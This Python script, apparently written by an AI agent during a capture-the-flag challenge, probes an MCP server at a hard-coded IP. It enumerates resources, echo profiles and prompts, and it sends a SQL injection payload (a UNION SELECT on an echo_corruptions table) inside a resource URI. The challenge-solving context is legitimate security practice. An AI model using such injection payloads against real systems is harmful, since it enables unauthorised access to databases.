#!/usr/bin/env python3
"""
Deep MCP Explorer for Hai Tsukemono
Author: Claude
Purpose: Deep exploration of MCP server resources and data structures
Created: 2025-11-23
Updated: 2025-11-23
Expected Result: Understand corruption data and filter format requirements
Produced Result: TBD
"""

import requests
import json
import base64
import pickle

MCP_URL = "http://154.57.164.74:31735/mcp/"
ALLY_KEY = "24a707bb346e2de34aab5d5349591599684a0e7d6280e5750aad30df3a8e38e0"

class MCPClient:
    def __init__(self, url):
        self.url = url
        self.session_id = None
        self.msg_id = 0

    def send_request(self, method, params=None):
        """Send MCP request"""
        self.msg_id += 1
        payload = {
            "jsonrpc": "2.0",
            "method": method,
            "params": params or {},
            "id": self.msg_id
        }

        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/event-stream"
        }

        if self.session_id:
            headers["mcp-session-id"] = self.session_id

        resp = requests.post(self.url, json=payload, headers=headers)

        # Check for MCP-Session-ID header
        if "mcp-session-id" in resp.headers:
            self.session_id = resp.headers["mcp-session-id"]

        # Parse SSE response
        if resp.text.startswith("event:"):
            lines = resp.text.strip().split('\n')
            for line in lines:
                if line.startswith("data: "):
                    data = json.loads(line[6:])
                    return data
        else:
            return resp.json()

    def initialize(self):
        """Initialize MCP connection"""
        result = self.send_request("initialize", {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "explorer", "version": "1.0"}
        })
        return result

    def read_resource(self, uri):
        """Read a resource"""
        result = self.send_request("resources/read", {"uri": uri})
        return result

    def call_tool(self, name, arguments):
        """Call a tool"""
        result = self.send_request("tools/call", {
            "name": name,
            "arguments": arguments
        })
        return result

    def get_prompt(self, name, arguments=None):
        """Get a prompt"""
        result = self.send_request("prompts/get", {
            "name": name,
            "arguments": arguments or {}
        })
        return result

# Initialize
client = MCPClient(MCP_URL)
client.initialize()

print("="*60)
print("Exploring Ally Status with SQL Injection")
print("="*60)

# Try to get corruption data via SQL injection
sqli_payload = f"{ALLY_KEY}' UNION SELECT id, corruption_type, corruption_value, purge_status FROM echo_corruptions WHERE echo_id=7--"
ally_status = client.read_resource(f"ash-data://ally/status/{sqli_payload}")
print(json.dumps(ally_status, indent=2))

print("\n" + "="*60)
print("Exploring Echo Profiles (1-9)")
print("="*60)

for i in range(1, 10):
    result = client.read_resource(f"ash-data://echo/profile/{i}")
    if "result" in result and "contents" in result["result"]:
        echo_data = json.loads(result["result"]["contents"][0]["text"])
        status = echo_data["echo"]["status"]
        name = echo_data["echo"]["source_name"]
        print(f"Echo {i}: {name} - Status: {status}")
        if echo_data.get("purged_corruptions"):
            print(f"  Purged corruptions: {len(echo_data['purged_corruptions'])}")

print("\n" + "="*60)
print("Exploring Prompts")
print("="*60)

# Try tactical plan prompt for Echo 7
tactical_plan = client.get_prompt("generate_tactical_plan", {"echo_id": "7"})
print("Tactical Plan for Echo 7:")
print(json.dumps(tactical_plan, indent=2))

print("\n" + "="*60)
print("Testing Different Resource URIs")
print("="*60)

test_uris = [
    "ash-data://corruptions",
    "ash-data://echo/corruptions/7",
    "ash-data://corruption/7",
    "ash-data://filter",
    "ash-data://protocol",
]

for uri in test_uris:
    result = client.read_resource(uri)
    if "error" not in result:
        print(f"\n[+] {uri} - SUCCESS")
        print(json.dumps(result, indent=2))
    else:
        print(f"[-] {uri} - {result['error']['message']}")

print("\n" + "="*60)
print("Done!")
print("="*60)
